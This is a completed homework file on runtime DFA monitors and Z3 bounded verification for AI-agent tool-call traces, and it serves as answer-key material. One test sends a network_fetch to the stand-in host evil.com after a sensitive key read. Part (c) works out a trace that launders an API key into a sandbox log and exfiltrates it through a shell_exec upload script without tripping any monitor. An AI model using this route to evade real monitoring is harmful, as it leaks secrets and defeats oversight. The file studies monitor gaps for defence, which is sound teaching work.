"""
CS292C Homework 2 — Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
===================================================================================
Part (a): Implement three stateful runtime monitors as DFAs.
Part (b): Verify the same properties using Z3 bounded model checking.
Part (c): Find a trace that passes all monitors but is still dangerous.
"""

from z3 import *
from dataclasses import dataclass

# ============================================================================
# Event Model
# ============================================================================

@dataclass
class ToolEvent:
    """A single tool-call event in an agent trace."""
    tool: str          # "file_read", "file_write", "shell_exec", "network_fetch"
    path: str          # target file/resource path
    is_sensitive: bool  # whether the target is sensitive

ALLOW = "ALLOW"
DENY = "DENY"


# ============================================================================
# Part (a): DFA Monitors — 8 pts
#
# Each monitor is a stateful object. Call monitor.step(event) for each
# event in order. It returns ALLOW or DENY.
#
# Implement the three monitors below.
# ============================================================================

SANDBOX_DIR = "/project/"  # paths starting with this are "in sandbox"

class SandboxMonitor:
    """
    Policy: Deny any file_write where path does not start with SANDBOX_DIR.
    All other tool calls are allowed.

    This is a 2-state DFA:
      - State OK (accepting): no violations yet.
      - State VIOLATION (rejecting): a write outside sandbox was attempted.
    Once in VIOLATION, all subsequent calls are denied.

    TODO: Implement __init__ and step.
    """

    def __init__(self):
        self.violated = False

    def step(self, event: ToolEvent) -> str:
        if self.violated:
            return DENY
        if event.tool == "file_write" and not event.path.startswith(SANDBOX_DIR):
            self.violated = True
            return DENY
        return ALLOW


class ReadBeforeWriteMonitor:
    """
    Policy: Deny any file_write to a path that has not been file_read first.

    This monitor tracks a set of "read paths". When a file_read occurs,
    the path is added to the set. When a file_write occurs, the path
    must already be in the set, or the monitor denies it.

    Unlike SandboxMonitor, this monitor does NOT enter an absorbing violation
    state — it only denies the specific file_write that has no prior read.
    Subsequent operations are evaluated independently.

    TODO: Implement __init__ and step.
    """

    def __init__(self):
        self.fileReads = []

    def step(self, event: ToolEvent) -> str:
        if(event.tool == "file_read"):
            self.fileReads.append(event.path)
        if(event.tool == "file_write"):
            for file in self.fileReads:
                if(file == event.path):
                    return ALLOW
            return DENY
        return ALLOW


class NoExfilMonitor:
    """
    Policy: After any file_read of a sensitive resource, deny ALL subsequent
    network_fetch calls (regardless of target).

    2-state DFA:
      - State CLEAN: no sensitive data has been read yet.
      - State TAINTED: a sensitive file_read has occurred.
    In TAINTED state, network_fetch is denied.

    TODO: Implement __init__ and step.
    """

    def __init__(self):
        self.tainted = False

    def step(self, event: ToolEvent) -> str:
        if(event.tool == "file_read" and event.is_sensitive == True):
            self.tainted = True
        if(event.tool == "network_fetch" and self.tainted == True):
            return DENY
        return ALLOW


class ComposedMonitor:
    """Runs all three monitors in parallel. Denies if ANY monitor denies."""

    def __init__(self):
        self.monitors = [SandboxMonitor(), ReadBeforeWriteMonitor(), NoExfilMonitor()]

    def step(self, event: ToolEvent) -> str:
        results = [m.step(event) for m in self.monitors]
        return DENY if DENY in results else ALLOW


# ============================================================================
# Part (a) continued: Test traces
# ============================================================================

def test_monitors():
    """Test the monitors on example traces."""

    print("=== Part (a): DFA Monitor Tests ===\n")

    # Trace 1: Should be fully allowed
    trace1 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/project/src/main.py", False),
        ToolEvent("shell_exec", "/project/run_tests.sh", False),
    ]

    # Trace 2: Should be denied by SandboxMonitor (write outside sandbox)
    trace2 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/etc/passwd", False),  # ← violation
    ]

    # Trace 3: Should be denied by ReadBeforeWriteMonitor (write without read)
    trace3 = [
        ToolEvent("file_write", "/project/src/new_file.py", False),  # ← no prior read
    ]

    # Trace 4: Should be denied by NoExfilMonitor (network after sensitive read)
    trace4 = [
        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive!
        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # ← denied
    ]

    for i, (trace, name) in enumerate([(trace1, "clean"), (trace2, "sandbox violation"),
                                        (trace3, "write-before-read"), (trace4, "exfiltration")], 1):
        cm = ComposedMonitor()
        results = []
        for event in trace:
            r = cm.step(event)
            results.append(r)

        print(f"  Trace {i} ({name}):")
        for event, r in zip(trace, results):
            print(f"    {event.tool:16s} {event.path:40s} → {r}")
        denied = any(r == DENY for r in results)
        print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")


# ============================================================================
# Part (b): Bounded Trace Verification with Z3 — 8 pts
#
# Verify the same three properties using Z3 bounded model checking.
# For each property, encode a symbolic trace of length K and check whether
# a violation is possible.
# ============================================================================

# Tool encoding for Z3
# These integer constants correspond to the string tool names in ToolEvent:
# FILE_READ=0 ↔ "file_read", FILE_WRITE=1 ↔ "file_write",
# SHELL_EXEC=2 ↔ "shell_exec", NETWORK_FETCH=3 ↔ "network_fetch"
FILE_READ = 0
FILE_WRITE = 1
SHELL_EXEC = 2
NETWORK_FETCH = 3

def make_symbolic_trace(K):
    """Create symbolic trace variables for K steps."""
    tool = [Int(f"tool_{i}") for i in range(K)]
    # path_in_sandbox[i] = True iff the target at step i is in the sandbox
    in_sandbox = [Bool(f"in_sandbox_{i}") for i in range(K)]
    # is_sensitive[i] = True iff the target at step i is sensitive
    is_sensitive = [Bool(f"is_sensitive_{i}") for i in range(K)]
    # path_id[i] = integer ID representing the file path
    path_id = [Int(f"path_{i}") for i in range(K)]

    # Well-formedness
    wf = []
    for i in range(K):
        wf.append(And(tool[i] >= 0, tool[i] <= 3))
        wf.append(And(path_id[i] >= 0, path_id[i] <= 9))

    return {'tool': tool, 'in_sandbox': in_sandbox,
            'is_sensitive': is_sensitive, 'path_id': path_id, 'K': K}, wf


def verify_property_bounded(name, K, prop_negation_fn):
    """
    Check if a property can be violated in any trace of length K.
    prop_negation_fn(trace) should return constraints asserting a violation exists.
    """
    trace, wf = make_symbolic_trace(K)
    s = Solver()
    s.add(wf)
    s.add(prop_negation_fn(trace))

    result = s.check()
    print(f"  {name} (K={K}): ", end="")
    if result == sat:
        m = s.model()
        print("VIOLATION FOUND:")
        for i in range(K):
            t = m.eval(trace['tool'][i]).as_long()
            names = {0: "file_read", 1: "file_write", 2: "shell_exec", 3: "net_fetch"}
            p = m.eval(trace['path_id'][i])
            sb = m.eval(trace['in_sandbox'][i], model_completion=True)
            se = m.eval(trace['is_sensitive'][i], model_completion=True)
            print(f"    step {i}: {names.get(t, '?'):12s} path={p} sandbox={sb} sensitive={se}")
    else:
        print("NO VIOLATION POSSIBLE (property holds for all traces)")
    print()


def part_b():
    """
    For each of the three properties, encode the NEGATION and use Z3 to
    find a violating trace (or prove none exists).

    TODO: Implement the negation functions for each property.
    """
    K = 8
    print(f"=== Part (b): Bounded Trace Verification (K={K}) ===\n")

    # Property 1: Sandbox — every file_write must have in_sandbox = True
    def negate_sandbox(trace):
        """
        Return constraints asserting: there EXISTS a step where
        tool = FILE_WRITE and in_sandbox = False.
        """
        K = trace['K']
        tool = trace['tool']
        in_sandbox = trace['in_sandbox']
        return [Or([And(tool[i] == FILE_WRITE, Not(in_sandbox[i])) for i in range(K)])]

    # Property 2: Read-before-write — every file_write at step j to path p
    # must have a file_read at some step i < j to the same path p.
    def negate_read_before_write(trace):
        """
        Assert ∃ j. tool[j] = FILE_WRITE ∧ ∀ i < j. ¬(tool[i] = FILE_READ ∧ path_id[i] = path_id[j]).
        """
        K = trace['K']
        tool = trace['tool']
        path_id = trace['path_id']
        clauses = []
        for j in range(K):
            no_prior_read = And(
                [Not(And(tool[i] == FILE_READ, path_id[i] == path_id[j])) for i in range(j)]
            ) if j > 0 else BoolVal(True)
            clauses.append(And(tool[j] == FILE_WRITE, no_prior_read))
        return [Or(clauses)]

    # Property 3: No exfiltration — if file_read at step i is sensitive,
    # then no network_fetch at any step j > i.
    def negate_no_exfil(trace):
        """
        Assert ∃ i < j. tool[i] = FILE_READ ∧ is_sensitive[i] ∧ tool[j] = NETWORK_FETCH.
        """
        K = trace['K']
        tool = trace['tool']
        is_sensitive = trace['is_sensitive']
        return [Or([
            And(tool[i] == FILE_READ, is_sensitive[i], tool[j] == NETWORK_FETCH)
            for i in range(K) for j in range(i + 1, K)
        ])]

    verify_property_bounded("Sandbox", K, negate_sandbox)
    verify_property_bounded("Read-before-write", K, negate_read_before_write)
    verify_property_bounded("No-exfiltration", K, negate_no_exfil)

# [EXPLAIN] The DFA monitor approach catches runtime violations. So, if a trace has ran/is running the monitor can catch that.
# The Z3 bounded approach finds out if it is POSSIBLE for a violation to occur, which isn't caught by a runtime check 
# Z3 exhaustively checks all possibilities


# ============================================================================
# Part (c): Monitor Completeness — 4 pts
#
# Find a trace of length 6 that is ACCEPTED by all three monitors but
# still violates a safety property not covered by the monitors.
#
# [EXPLAIN] in a comment in part_c():
# 1. What property does your trace violate?
# 2. Why don't the three monitors catch it?
# 3. What additional monitor would you add to catch it?
# ============================================================================

def part_c():
    """
    TODO: Construct a trace (list of ToolEvent) of length 6 that passes
    the ComposedMonitor but is still dangerous.

    Hint: Think about what the three monitors DON'T check. For example:
    - Do they check how many times a tool is called?
    - Do they check if shell_exec runs a dangerous command?
    - Do they check if a file is read, modified, then the modified version
      is sent over the network?
    """
    print("=== Part (c): Monitor Completeness ===\n")

    # 6-step trace: read a secret, launder it into a sandbox log via legitimate
    # writes, then exfiltrate via shell_exec. Every step passes all three monitors.
    trace = [
        ToolEvent("file_read",  "/project/secrets/api_key.txt", True),   # sensitive read taints NoExfilMonitor (only blocks network_fetch)
        ToolEvent("file_read",  "/project/output.log",          False),  # required to satisfy ReadBeforeWriteMonitor for next step
        ToolEvent("file_write", "/project/output.log",          False),  # secret laundered into a non-sensitive sandbox file
        ToolEvent("file_read",  "/project/output.log",          False),
        ToolEvent("file_write", "/project/output.log",          False),
        ToolEvent("shell_exec", "/project/upload.sh",           False),  # exfiltrates output.log; shell_exec is not network_fetch
    ]

    cm = ComposedMonitor()
    print("  Trace:")
    all_allowed = True
    for event in trace:
        r = cm.step(event)
        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} → {r}")
        if r == DENY:
            all_allowed = False

    print(f"\n  All allowed: {all_allowed}")
    # [EXPLAIN]
    # 1. Property violated: confidentiality — sensitive content from /project/secrets/api_key.txt
    #    is exfiltrated via shell_exec at step 6 (e.g., the script curls upload.evil.com).
    # 2. The monitors miss it because each one is single-event and syntactic:
    #      - SandboxMonitor inspects only file_write paths.
    #      - ReadBeforeWriteMonitor inspects only file_write provenance, not data flow.
    #      - NoExfilMonitor blocks the literal network_fetch tool, not shell_exec.
    #    None of them tracks taint propagation or the semantics of shell commands.
    # 3. Add a TaintFlowMonitor: mark any path written to after a sensitive read as
    #    tainted, and deny shell_exec / network_fetch involving any tainted path; or
    #    simply extend NoExfilMonitor to deny shell_exec after a sensitive read too.
    print()


# ============================================================================
if __name__ == "__main__":
    test_monitors()
    part_b()
    part_c()
